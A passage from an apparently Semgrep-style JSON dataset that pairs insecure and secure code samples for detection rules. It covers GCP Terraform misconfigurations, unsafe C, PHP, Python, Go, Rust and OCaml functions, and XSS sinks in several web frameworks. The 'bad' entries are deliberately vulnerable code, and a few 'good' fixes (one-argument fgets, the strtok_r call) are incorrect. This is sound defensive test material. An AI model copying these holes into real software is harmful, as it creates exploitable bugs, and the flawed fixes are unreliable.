    "code": "# ok: gcp-bigquery-dataset-encrypted-with-cmk\nresource \"google_bigquery_dataset\" \"pass\" {\n  dataset_id                  = var.dataset.dataset_id\n  friendly_name               = var.dataset.friendly_name\n  description                 = var.dataset.description\n  location                    = var.location\n  default_table_expiration_ms = var.dataset.default_table_expiration_ms\n\n  default_encryption_configuration {\n    kms_key_name = google_kms_crypto_key.example.name\n  }\n}",
    "language": "hcl",
    "description": "encryption configured with KMS key"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure GCP Terraform Configurations",
    "type": "bad",
    "code": "# ruleid: gcp-pubsub-encrypted-with-cmk\nresource \"google_pubsub_topic\" \"fail\" {\n  name = \"example-topic\"\n}",
    "language": "hcl",
    "description": "no KMS key specified"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure GCP Terraform Configurations",
    "type": "good",
    "code": "# ok: gcp-pubsub-encrypted-with-cmk\nresource \"google_pubsub_topic\" \"pass\" {\n  name         = \"example-topic\"\n  kms_key_name = google_kms_crypto_key.crypto_key.id\n}",
    "language": "hcl",
    "description": "KMS key specified"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure GCP Terraform Configurations",
    "type": "bad",
    "code": "# ruleid: gcp-artifact-registry-encrypted-with-cmk\nresource \"google_artifact_registry_repository\" \"fail\" {\n  provider = google-beta\n\n  location      = \"us-central1\"\n  repository_id = \"my-repository\"\n  description   = \"example docker repository with cmek\"\n  format        = \"DOCKER\"\n}",
    "language": "hcl",
    "description": "no KMS key specified"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure GCP Terraform Configurations",
    "type": "good",
    "code": "# ok: gcp-artifact-registry-encrypted-with-cmk\nresource \"google_artifact_registry_repository\" \"pass\" {\n  provider = google-beta\n\n  location      = \"us-central1\"\n  repository_id = \"my-repository\"\n  description   = \"example docker repository with cmek\"\n  format        = \"DOCKER\"\n  kms_key_name  = google_kms_crypto_key.example.name\n}",
    "language": "hcl",
    "description": "KMS key specified"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure GCP Terraform Configurations",
    "type": "bad",
    "code": "# ruleid: gcp-dataproc-cluster-public-ip\nresource \"google_dataproc_cluster\" \"fail1\" {\n  name   = \"my-fail1-cluster\"\n  region = \"us-central1\"\n\n  cluster_config {\n    gce_cluster_config {\n      zone = \"us-central1-a\"\n      # \"internal_ip_only\" does not exist\n      # and the default is public IPs\n    }\n  }\n}\n\n# ruleid: gcp-dataproc-cluster-public-ip\nresource \"google_dataproc_cluster\" \"fail2\" {\n  name   = \"my-fail2-cluster\"\n  region = \"us-central1\"\n\n  cluster_config {\n    gce_cluster_config {\n      zone = \"us-central1-a\"\n      internal_ip_only = false\n    }\n  }\n}",
    "language": "hcl",
    "description": "internal_ip_only not set or false"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure GCP Terraform Configurations",
    "type": "good",
    "code": "# ok: gcp-dataproc-cluster-public-ip\nresource \"google_dataproc_cluster\" \"pass1\" {\n  name   = \"my-pass-cluster\"\n  region = \"us-central1\"\n\n  cluster_config {\n    gce_cluster_config {\n      zone = \"us-central1-a\"\n      # no public IPs\n      internal_ip_only = true\n    }\n  }\n}",
    "language": "hcl",
    "description": "internal_ip_only set to true"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure GCP Terraform Configurations",
    "type": "bad",
    "code": "# ruleid: gcp-vertexai-private-instance\nresource \"google_notebooks_instance\" \"fail1\" {\n  name = \"fail1-instance\"\n  location = \"us-west1-a\"\n  machine_type = \"e2-medium\"\n  vm_image {\n    project      = \"deeplearning-platform-release\"\n    image_family = \"tf-latest-cpu\"\n  }\n  no_public_ip = false\n}\n\n# ruleid: gcp-vertexai-private-instance\nresource \"google_notebooks_instance\" \"fail2\" {\n  name = \"fail2-instance\"\n  location = \"us-west1-a\"\n  machine_type = \"e2-medium\"\n  vm_image {\n    project      = \"deeplearning-platform-release\"\n    image_family = \"tf-latest-cpu\"\n  }\n}",
    "language": "hcl",
    "description": "no_public_ip not set or false"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure GCP Terraform Configurations",
    "type": "good",
    "code": "# ok: gcp-vertexai-private-instance\nresource \"google_notebooks_instance\" \"pass1\" {\n  name = \"pass1-instance\"\n  location = \"us-west1-a\"\n  machine_type = \"e2-medium\"\n  vm_image {\n    project      = \"deeplearning-platform-release\"\n    image_family = \"tf-latest-cpu\"\n  }\n  no_public_ip = true\n}",
    "language": "hcl",
    "description": "no_public_ip set to true"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure GCP Terraform Configurations",
    "type": "bad",
    "code": "# ruleid: gcp-dns-key-specs-rsasha1\nresource \"google_dns_managed_zone\" \"fail\" {\n    name        = \"example-zone\"\n    dns_name    = \"example-de13he3.com.\"\n    description = \"Example DNS zone\"\n    dnssec_config {\n        state = on\n        default_key_specs {\n            algorithm  = \"rsasha1\"\n            key_length = 1024\n            key_type   = \"zoneSigning\"\n        }\n        default_key_specs {\n            algorithm = \"rsasha1\"\n            key_length = 2048\n            key_type = \"keySigning\"\n        }\n    }\n}",
    "language": "hcl",
    "description": "RSASHA1 algorithm used"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure GCP Terraform Configurations",
    "type": "good",
    "code": "# ok: gcp-dns-key-specs-rsasha1\nresource \"google_dns_managed_zone\" \"success\" {\n    name        = \"example-zone\"\n    dns_name    = \"example-de13he3.com.\"\n    description = \"Example DNS zone\"\n    dnssec_config {\n        state = on\n        default_key_specs {\n            algorithm  = \"rsasha256\"\n            key_length = 1024\n            key_type   = \"zoneSigning\"\n        }\n        default_key_specs {\n            algorithm = \"rsasha256\"\n            key_length = 2048\n            key_type = \"keySigning\"\n        }\n    }\n}",
    "language": "hcl",
    "description": "stronger algorithm used"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure GCP Terraform Configurations",
    "type": "bad",
    "code": "# ruleid: gcp-insecure-load-balancer-tls-version\nresource \"google_compute_ssl_policy\" \"badCode\" {\n  name = \"badCode\"\n  min_tls_version = \"TLS_1_0\"\n}",
    "language": "hcl",
    "description": "TLS 1.0 or 1.1 allowed"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure GCP Terraform Configurations",
    "type": "good",
    "code": "# ok: gcp-insecure-load-balancer-tls-version\nresource \"google_compute_ssl_policy\" \"okCode\" {\n  name = \"okCode\"\n  min_tls_version = \"TLS_1_2\"\n}",
    "language": "hcl",
    "description": "TLS 1.2 minimum"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure GCP Terraform Configurations",
    "type": "bad",
    "code": "# ruleid: gcp-compute-ssl-policy\nresource \"google_compute_ssl_policy\" \"fail1\" {\n    name            = \"nonprod-ssl-policy\"\n    profile         = \"MODERN\"\n}\n\n# ruleid: gcp-compute-ssl-policy\nresource \"google_compute_ssl_policy\" \"fail2\" {\n    name            = \"custom-ssl-policy\"\n    min_tls_version = \"TLS_1_2\"\n    profile         = \"CUSTOM\"\n    custom_features = [\"TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384\", \"TLS_RSA_WITH_AES_256_GCM_SHA384\"]\n}",
    "language": "hcl",
    "description": "weak ciphers allowed or min_tls_version not set"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure GCP Terraform Configurations",
    "type": "good",
    "code": "# ok: gcp-compute-ssl-policy\nresource \"google_compute_ssl_policy\" \"success1\" {\n    name            = \"nonprod-ssl-policy\"\n    profile         = \"MODERN\"\n    min_tls_version = \"TLS_1_2\"\n}\n\n# ok: gcp-compute-ssl-policy\nresource \"google_compute_ssl_policy\" \"success1\" {\n    name            = \"custom-ssl-policy\"\n    min_tls_version = \"TLS_1_2\"\n    profile         = \"CUSTOM\"\n    custom_features = [\"TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384\", \"TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384\"]\n}",
    "language": "hcl",
    "description": "strong ciphers only with TLS 1.2"
  },
  {
    "ruleId": "",
    "ruleTitle": "Avoid Unsafe Functions",
    "type": "bad",
    "code": "int bad_strcpy(src, dst) {\n    n = DST_BUFFER_SIZE;\n    if ((dst != NULL) && (src != NULL) && (strlen(dst)+strlen(src)+1 <= n))\n    {\n        // ruleid: insecure-use-strcat-fn\n        strcat(dst, src);\n\n        // ruleid: insecure-use-strcat-fn\n        strncat(dst, src, 100);\n    }\n}",
    "language": "c",
    "description": "C - strcat buffer overflow"
  },
  {
    "ruleId": "",
    "ruleTitle": "Avoid Unsafe Functions",
    "type": "good",
    "code": "// Use strcat_s which performs bounds checking",
    "language": "c",
    "description": "C - use strcat_s with bounds checking"
  },
  {
    "ruleId": "",
    "ruleTitle": "Avoid Unsafe Functions",
    "type": "bad",
    "code": "int bad_strcpy(src, dst) {\n    n = DST_BUFFER_SIZE;\n    if ((dst != NULL) && (src != NULL) && (strlen(dst)+strlen(src)+1 <= n))\n    {\n        // ruleid: insecure-use-string-copy-fn\n        strcpy(dst, src);\n\n        // ruleid: insecure-use-string-copy-fn\n        strncpy(dst, src, 100);\n    }\n}",
    "language": "c",
    "description": "C - strcpy buffer overflow"
  },
  {
    "ruleId": "",
    "ruleTitle": "Avoid Unsafe Functions",
    "type": "good",
    "code": "// Use strcpy_s which performs bounds checking",
    "language": "c",
    "description": "C - use strcpy_s with bounds checking"
  },
  {
    "ruleId": "",
    "ruleTitle": "Avoid Unsafe Functions",
    "type": "bad",
    "code": "int bad_code() {\n    char str[DST_BUFFER_SIZE];\n    fgets(str, DST_BUFFER_SIZE, stdin);\n    // ruleid:insecure-use-strtok-fn\n    strtok(str, \" \");\n    printf(\"%s\", str);\n    return 0;\n}",
    "language": "c",
    "description": "C - strtok modifies buffer"
  },
  {
    "ruleId": "",
    "ruleTitle": "Avoid Unsafe Functions",
    "type": "good",
    "code": "int main() {\n    char str[DST_BUFFER_SIZE];\n    char dest[DST_BUFFER_SIZE];\n    fgets(str, DST_BUFFER_SIZE, stdin);\n    // ok:insecure-use-strtok-fn\n    strtok_r(str, \" \", *dest);\n    printf(\"%s\", str);\n    return 0;\n}",
    "language": "c",
    "description": "C - use strtok_r instead"
  },
  {
    "ruleId": "",
    "ruleTitle": "Avoid Unsafe Functions",
    "type": "bad",
    "code": "int bad_code() {\n    char str[DST_BUFFER_SIZE];\n    // ruleid:insecure-use-scanf-fn\n    scanf(\"%s\", str);\n    printf(\"%s\", str);\n    return 0;\n}",
    "language": "c",
    "description": "C - scanf buffer overflow"
  },
  {
    "ruleId": "",
    "ruleTitle": "Avoid Unsafe Functions",
    "type": "good",
    "code": "int main() {\n    char str[DST_BUFFER_SIZE];\n    // ok:insecure-use-scanf-fn\n    fgets(str);\n    printf(\"%s\", str);\n    return 0;\n}",
    "language": "c",
    "description": "C - use fgets instead"
  },
  {
    "ruleId": "",
    "ruleTitle": "Avoid Unsafe Functions",
    "type": "bad",
    "code": "int bad_code() {\n    char str[DST_BUFFER_SIZE];\n    // ruleid:insecure-use-gets-fn\n    gets(str);\n    printf(\"%s\", str);\n    return 0;\n}",
    "language": "c",
    "description": "C - gets buffer overflow"
  },
  {
    "ruleId": "",
    "ruleTitle": "Avoid Unsafe Functions",
    "type": "good",
    "code": "int main() {\n    char str[DST_BUFFER_SIZE];\n    // ok:insecure-use-gets-fn\n    fgets(str);\n    printf(\"%s\", str);\n    return 0;\n}",
    "language": "c",
    "description": "C - use fgets or gets_s instead"
  },
  {
    "ruleId": "",
    "ruleTitle": "Avoid Unsafe Functions",
    "type": "bad",
    "code": "<?php\n\n// ruleid: mcrypt-use\nmcrypt_ecb(MCRYPT_BLOWFISH, $key, base64_decode($input), MCRYPT_DECRYPT);\n\n// ruleid: mcrypt-use\nmcrypt_create_iv($iv_size, MCRYPT_RAND);\n\n// ruleid: mcrypt-use\nmdecrypt_generic($td, $c_t);",
    "language": "php",
    "description": "PHP - deprecated mcrypt functions"
  },
  {
    "ruleId": "",
    "ruleTitle": "Avoid Unsafe Functions",
    "type": "good",
    "code": "<?php\n\n// ok: mcrypt-use\nsodium_crypto_secretbox(\"Hello World!\", $nonce, $key);\n\n// ok: mcrypt-use\nopenssl_encrypt($plaintext, $cipher, $key, $options=0, $iv, $tag);",
    "language": "php",
    "description": "PHP - use Sodium or OpenSSL"
  },
  {
    "ruleId": "",
    "ruleTitle": "Avoid Unsafe Functions",
    "type": "bad",
    "code": "import tempfile as tf\n\n# ruleid: tempfile-insecure\nx = tempfile.mktemp()\n# ruleid: tempfile-insecure\nx = tempfile.mktemp(dir=\"/tmp\")",
    "language": "python",
    "description": "Python - tempfile.mktemp race condition"
  },
  {
    "ruleId": "",
    "ruleTitle": "Avoid Unsafe Functions",
    "type": "good",
    "code": "import tempfile\n\n# Use NamedTemporaryFile instead\nwith tempfile.NamedTemporaryFile() as tmp:\n    tmp.write(b\"data\")",
    "language": "python",
    "description": "Python - use NamedTemporaryFile"
  },
  {
    "ruleId": "",
    "ruleTitle": "Avoid Unsafe Functions",
    "type": "bad",
    "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"unsafe\"\n\n\tfoobarbaz \"unsafe\"\n)\n\ntype Fake struct{}\n\nfunc (Fake) Good() {}\nfunc main() {\n\tunsafeM := Fake{}\n\tunsafeM.Good()\n\tintArray := [...]int{1, 2}\n\tfmt.Printf(\"\\nintArray: %v\\n\", intArray)\n\tintPtr := &intArray[0]\n\tfmt.Printf(\"\\nintPtr=%p, *intPtr=%d.\\n\", intPtr, *intPtr)\n\t// ruleid: use-of-unsafe-block\n\taddressHolder := uintptr(foobarbaz.Pointer(intPtr)) + unsafe.Sizeof(intArray[0])\n\t// ruleid: use-of-unsafe-block\n\tintPtr = (*int)(foobarbaz.Pointer(addressHolder))\n\tfmt.Printf(\"\\nintPtr=%p, *intPtr=%d.\\n\\n\", intPtr, *intPtr)\n}",
    "language": "go",
    "description": "Go - unsafe package bypasses type safety"
  },
  {
    "ruleId": "",
    "ruleTitle": "Avoid Unsafe Functions",
    "type": "good",
    "code": "// Avoid using the unsafe package. Use Go's type-safe alternatives for memory operations.",
    "language": "go",
    "description": "Go - avoid unsafe package"
  },
  {
    "ruleId": "",
    "ruleTitle": "Avoid Unsafe Functions",
    "type": "bad",
    "code": "// ruleid: unsafe-usage\nlet pid = unsafe { libc::getpid() as u32 };",
    "language": "rust",
    "description": "Rust - unsafe block bypasses safety"
  },
  {
    "ruleId": "",
    "ruleTitle": "Avoid Unsafe Functions",
    "type": "good",
    "code": "// ok: unsafe-usage\nlet pid = libc::getpid() as u32;",
    "language": "rust",
    "description": "Rust - use safe alternatives"
  },
  {
    "ruleId": "",
    "ruleTitle": "Avoid Unsafe Functions",
    "type": "bad",
    "code": "let cb = Array.make 10 2 in\n(* ruleid:ocamllint-unsafe *)\nPrintf.printf \"%d\\n\" (Array.unsafe_get cb 12)",
    "language": "ocaml",
    "description": "OCaml - unsafe functions skip bounds checks"
  },
  {
    "ruleId": "",
    "ruleTitle": "Avoid Unsafe Functions",
    "type": "good",
    "code": "let cb = Array.make 10 2 in\n(* Use bounds-checked version *)\nPrintf.printf \"%d\\n\" (Array.get cb 0)",
    "language": "ocaml",
    "description": "OCaml - use bounds-checked functions"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Cross-Site Scripting (XSS)",
    "type": "bad",
    "code": "function bad1(userInput) {\n  // ruleid: insecure-innerhtml\n  el.innerHTML = '<div>' + userInput + '</div>';\n}\n\nfunction bad2(userInput) {\n  // ruleid: insecure-innerhtml\n  document.body.innerHTML = userInput;\n}\n\nfunction bad3(userInput) {\n  const name = '<div>' + userInput + '</div>';\n  // ruleid: insecure-innerhtml\n  document.body.innerHTML = name;\n}",
    "language": "javascript",
    "description": "vulnerable to XSS"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Cross-Site Scripting (XSS)",
    "type": "good",
    "code": "function ok1() {\n  const name = \"<div>it's ok</div>\";\n  // ok: insecure-innerhtml\n  el.innerHTML = name;\n}\n\nfunction ok2() {\n  // ok: insecure-innerhtml\n  document.body.innerHTML = \"<div>it's ok</div>\";\n}",
    "language": "javascript",
    "description": "properly escaped"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Cross-Site Scripting (XSS)",
    "type": "bad",
    "code": "// ruleid:dom-based-xss\ndocument.write(\"<OPTION value=1>\"+document.location.href.substring(document.location.href.indexOf(\"default=\")+8)+\"</OPTION>\");",
    "language": "javascript",
    "description": "vulnerable to DOM-based XSS"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Cross-Site Scripting (XSS)",
    "type": "good",
    "code": "// ok:dom-based-xss\ndocument.write(\"<OPTION value=2>English</OPTION>\");",
    "language": "javascript",
    "description": "safe static content"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Cross-Site Scripting (XSS)",
    "type": "bad",
    "code": "function bad1(userInput) {\n// ruleid: insecure-document-method\n  el.innerHTML = '<div>' + userInput + '</div>';\n}\n\nfunction bad2(userInput) {\n// ruleid: insecure-document-method\n  document.body.outerHTML = userInput;\n}\n\nfunction bad3(userInput) {\n  const name = '<div>' + userInput + '</div>';\n// ruleid: insecure-document-method\n  document.write(name);\n}",
    "language": "javascript",
    "description": "user-controlled data in document methods"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Cross-Site Scripting (XSS)",
    "type": "good",
    "code": "function ok1() {\n  const name = \"<div>it's ok</div>\";\n// ok: insecure-document-method\n  el.innerHTML = name;\n}\n\nfunction ok2() {\n// ok: insecure-document-method\n  document.write(\"<div>it's ok</div>\");\n}",
    "language": "javascript",
    "description": "static content only"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Cross-Site Scripting (XSS)",
    "type": "bad",
    "code": "(function ($) {\n\n  function bad1() {\n    var content = '<div>' + window.location.hash + '</div>';\n    // ruleid: jquery-insecure-method\n    $( \"div\" ).html( content );\n  }\n\n  function bad2() {\n    // ruleid: jquery-insecure-method\n    $( userInput ).appendTo( \"#foo\" );\n  }\n\n  function bad4() {\n    // ruleid: jquery-insecure-method\n    $('<div>' + window.location.hash + '</div>').insertBefore( \".inner\" );\n    // ruleid: jquery-insecure-method\n    $('.inner').prepend(window.location.hash);\n  }\n\n  function bad5(userInput) {\n    // ruleid: jquery-insecure-method\n    $( \".inner\" ).wrap( \"<div class='new'>\" + userInput + \"</div>\" );\n    // ruleid: jquery-insecure-method\n    $( \"p\" ).wrapAll(userInput);\n  }\n\n})(jQuery);",
    "language": "javascript",
    "description": "user input in jQuery methods"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Cross-Site Scripting (XSS)",
    "type": "good",
    "code": "(function ($) {\n\n  function ok1() {\n    const item = '<div></div>';\n    // ok: jquery-insecure-method\n    $( \".inner\" ).wrap(item);\n  }\n\n  function ok2(userInput) {\n    // ok: jquery-insecure-method\n    $( \"div\" ).html( '<div></div>' );\n  }\n\n  function ok3(userInput) {\n    jQuery(document).ready(function($){\n      // ok: jquery-insecure-method\n      $('<input type=\"checkbox\"/>').prependTo('.checklist-box li');\n    });\n  }\n\n})(jQuery);",
    "language": "javascript",
    "description": "static content"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Cross-Site Scripting (XSS)",
    "type": "bad",
    "code": "const express = require('express')\nconst router = express.Router()\n\nrouter.get('/greeting', (req, res) => {\n    const { name } = req.query;\n    // ruleid: direct-response-write\n    res.send('<h1> Hello :' + name + \"</h1>\")\n})\n\napp.get('/', function (req, res) {\n    var user = req.query.name;\n    msg = \"Hi \" + user\n    // ruleid: direct-response-write\n    res.send('Response</br>' + msg);\n});\n\napp.get('/xss', function (req, res) {\n    var html = \"ASadad\" + req.query.name + \"Asdadads\"\n    // ruleid: direct-response-write\n    res.write('Response</br>' + html);\n});",
    "language": "javascript",
    "description": "direct response write with user input"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Cross-Site Scripting (XSS)",
    "type": "good",
    "code": "const express = require('express')\nconst router = express.Router()\nvar xss = require(\"xss\");\n\n// Template handles escaping\nrouter.get('/greet-template', (req, res) => {\n    name = req.query.name\n    // ok: direct-response-write\n    res.render('index', { user_name: name });\n})\n\n// Using XSS sanitization library\nrouter.get('/greet-template', (req, res) => {\n    a = req.query.name\n    // ok: direct-response-write\n    res.send('<h1> Hello :' + xss(a) + \"</h1>\")\n})\n\napp.get('/noxss', function (req, res) {\n    var resp = req.query.name;\n    // ok: direct-response-write\n    res.write('Response</br>');\n});",
    "language": "javascript",
    "description": "use templates or sanitization"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Cross-Site Scripting (XSS)",
    "type": "bad",
    "code": "function encodeProductDescription (tableData: any[]) {\n  for (let i = 0; i < tableData.length; i++) {\n    // ruleid: detect-replaceall-sanitization\n    tableData[i].description = tableData[i].description.replaceAll('<', '&lt;').replaceAll('>', '&gt;')\n  }\n}",
    "language": "javascript",
    "description": "manual replace-based sanitization"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Cross-Site Scripting (XSS)",
    "type": "good",
    "code": "function encodeProductDescription (tableData: any[]) {\n  for (let i = 0; i < tableData.length; i++) {\n    // ok - use DOMPurify or sanitize-html instead\n    tableData[i].description = DOMPurify.sanitize(tableData[i].description)\n  }\n}",
    "language": "javascript",
    "description": "use proper sanitization library"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Cross-Site Scripting (XSS)",
    "type": "bad",
    "code": "import DOMPurify from \"dompurify\"\nimport sanitize from \"xss\"\n\nfunction TestComponent2(foo) {\n    // ruleid:react-dangerouslysetinnerhtml\n    let params = {smth: 'test123', dangerouslySetInnerHTML: {__html: foo.bar},a:b};\n    return React.createElement('div', params);\n}",
    "language": "typescript",
    "description": "non-constant value in dangerouslySetInnerHTML"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Cross-Site Scripting (XSS)",
    "type": "good",
    "code": "import DOMPurify from \"dompurify\"\nimport sanitize from \"xss\"\n\nfunction TestComponent1() {\n    // ok:react-dangerouslysetinnerhtml\n  return <div dangerouslySetInnerHTML={createMarkup()} />;\n}\n\nfunction OkComponent1() {\n    // ok:react-dangerouslysetinnerhtml\n  return <li className={\"foobar\"} dangerouslySetInnerHTML={{__html: DOMPurify.sanitize(foo)}} />;\n}\n\nfunction OkComponent3() {\n    // ok:react-dangerouslysetinnerhtml\n    let params = {smth: 'test123', dangerouslySetInnerHTML: {__html: sanitize(foo)},a:b};\n    return React.createElement('div', params);\n}\n\nfunction OkComponent4() {\n    // ok:react-dangerouslysetinnerhtml\n    let params = {smth: 'test123', dangerouslySetInnerHTML: {__html: \"hi\"},a:b};\n    return React.createElement('div', params);\n}",
    "language": "typescript",
    "description": "sanitized or static content"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Cross-Site Scripting (XSS)",
    "type": "bad",
    "code": "function Test2(input) {\n  // ruleid: react-unsanitized-property\n    ReactDOM.findDOMNode(this.someRef).outerHTML = input.value;\n  }",
    "language": "typescript",
    "description": "setting innerHTML/outerHTML directly"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Cross-Site Scripting (XSS)",
    "type": "good",
    "code": "  function OkTest1() {\n  // ok: react-unsanitized-property\n    this.element.innerHTML = \"<a href='/about.html'>About</a>\";\n  }\n\n  function OkTest2() {\n  // ok: react-unsanitized-property\n    ReactDOM.findDOMNode(this.someRef).outerHTML = \"<a href='/about.html'>About</a>\";\n  }",
    "language": "typescript",
    "description": "static content"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Cross-Site Scripting (XSS)",
    "type": "bad",
    "code": "import { DomSanitizer, SecurityContext } from '@angular/platform-browser'\nimport DOMPurify from 'dompurify'\n\nclass SomeClass {\n    constructor(private sanitizer: DomSanitizer){}\n\n    bypass(value: string){\n        // ruleid:angular-bypasssecuritytrust\n        let html = this.sanitizer.bypassSecurityTrustHtml(value);\n        // ruleid:angular-bypasssecuritytrust\n        let style = this.sanitizer.bypassSecurityTrustStyle(value);\n        // ruleid:angular-bypasssecuritytrust\n        let script = this.sanitizer.bypassSecurityTrustScript(value);\n        // ruleid:angular-bypasssecuritytrust\n        let resource_url = this.sanitizer.bypassSecurityTrustResourceUrl(value);\n        // ruleid:angular-bypasssecuritytrust\n        let url = this.sanitizer.bypassSecurityTrustUrl(value);\n    }\n}",
    "language": "typescript",
    "description": "bypassing Angular security"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Cross-Site Scripting (XSS)",
    "type": "good",
    "code": "import { DomSanitizer, SecurityContext } from '@angular/platform-browser'\nimport DOMPurify from 'dompurify'\n\nclass SomeClass {\n    constructor(private sanitizer: DomSanitizer){}\n\n    bypass(value: string){\n        // ok:angular-bypasssecuritytrust\n        let url1 = this.sanitizer.bypassSecurityTrustUrl(\"a\");\n        // ok:angular-bypasssecuritytrust\n        let html1 = this.sanitizer.bypassSecurityTrustHtml(\"value\");\n        // ok:angular-bypasssecuritytrust\n        let html2 = this.sanitizer.bypassSecurityTrustHtml(DOMPurify.sanitize(\"value\"))\n    }\n}",
    "language": "typescript",
    "description": "static content or pre-sanitized"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Cross-Site Scripting (XSS)",
    "type": "bad",
    "code": "<div>\n  <!-- ruleid: avoid-v-html -->\n  <span dir=\"auto\" class=\"markdown\" v-html=\"entry.post\"></span>\n</div>",
    "language": "vue",
    "description": "using v-html with user content"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Cross-Site Scripting (XSS)",
    "type": "good",
    "code": "<div>\n  <!-- ok: avoid-v-html -->\n  <span dir=\"auto\" class=\"markdown\">{{entry.post}}</span>\n</div>",
    "language": "vue",
    "description": "using template interpolation"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Cross-Site Scripting (XSS)",
    "type": "bad",
    "code": "from flask import make_response, request\n\ndef test1():\n    # ruleid: response-contains-unsanitized-input\n    x = request.args.get(\"x\")\n    return make_response(\"found {}\".format(x))\n\n\ndef test1():\n    # ruleid: response-contains-unsanitized-input\n    x = request.args.get(\"x\")\n    y = make_response(\"found {}\".format(x))\n    return y\n\n\ndef test3():\n    # ruleid: response-contains-unsanitized-input\n    x = request.args.get(\"x\")\n    return make_response(f\"found {x}\")",
    "language": "python",
    "description": "user input in response"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Cross-Site Scripting (XSS)",
    "type": "good",
    "code": "from flask import make_response, request\n\ndef test2():\n    # ok: response-contains-unsanitized-input\n    x = request.args.get(\"x\")\n    y = some_safe_operation_on(x)\n    return make_response(\"found {}\".format(y))",
    "language": "python",
    "description": "sanitized input"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Cross-Site Scripting (XSS)",
    "type": "bad",
    "code": "import urllib\nfrom django.http import HttpResponse, HttpResponseBadRequest\n\ndef search_certificates(request):\n    # ruleid: reflected-data-httpresponse\n    user_filter = request.GET.get(\"user\", \"\")\n    if not user_filter:\n        msg = _(\"user is not given.\")\n        return HttpResponseBadRequest(msg)\n\n    user = User.objects.get(Q(email=user_filter) | Q(username=user_filter))\n    if user.DoesNotExist:\n        return HttpResponse(_(\"user '{user}' does not exist\").format(user_filter))\n\ndef inline_test(request):\n    # ruleid: reflected-data-httpresponse\n    return HttpResponse(\"Received {}\".format(request.POST.get('message')))",
    "language": "python",
    "description": "request data in HttpResponse"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Cross-Site Scripting (XSS)",
    "type": "good",
    "code": "from django.http import HttpResponse\n\ndef previewNode(request, uid):\n    \"\"\"Preview evaluante node\"\"\"\n    try:\n        if uid in engines:\n            # ok: reflected-data-httpresponse\n            _nodeId = request.data.get('nodeId')\n            engines[uid].stoppable = True\n            _res = engines[uid].model.previewNode(_nodeId)\n            if _res is None:\n                return HttpResponse('', status=204)\n            return HttpResponse(_res)\n        return manageNoEngine()\n    except Exception as e:\n        return genericApiException(e, engines[uid])",
    "language": "python",
    "description": "properly handled response"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Cross-Site Scripting (XSS)",
    "type": "bad",
    "code": "import jinja2\nfrom jinja2 import Environment, select_autoescape\ntemplateLoader = jinja2.FileSystemLoader( searchpath=\"/\" )\nsomething = ''\n\n# ruleid:incorrect-autoescape-disabled\nEnvironment(loader=templateLoader, load=templateLoader, autoescape=something)\n\n# ruleid:incorrect-autoescape-disabled\ntemplateEnv = jinja2.Environment(autoescape=False, loader=templateLoader )\n\nEnvironment(loader=templateLoader,\n            load=templateLoader,\n# ruleid:incorrect-autoescape-disabled\n            autoescape=False)\n\ndef fake_func():\n    return 'foobar'\n\n# ruleid:incorrect-autoescape-disabled\nEnvironment(loader=templateLoader, autoescape=fake_func())",
    "language": "python",
    "description": "autoescape disabled"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Cross-Site Scripting (XSS)",
    "type": "good",
    "code": "import jinja2\nfrom jinja2 import Environment, select_autoescape\ntemplateLoader = jinja2.FileSystemLoader( searchpath=\"/\" )\n\n# ok:incorrect-autoescape-disabled\nEnvironment(loader=templateLoader, load=templateLoader, autoescape=True)\n\n# ok:incorrect-autoescape-disabled\ntemplateEnv = jinja2.Environment(autoescape=True,\n        loader=templateLoader )\n\n# ok:incorrect-autoescape-disabled\nEnvironment(loader=templateLoader, autoescape=select_autoescape())\n\nEnvironment(loader=templateLoader,\n# ok:incorrect-autoescape-disabled\n            autoescape=select_autoescape(['html', 'htm', 'xml']))",
    "language": "python",
    "description": "autoescape enabled"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Cross-Site Scripting (XSS)",
    "type": "bad",
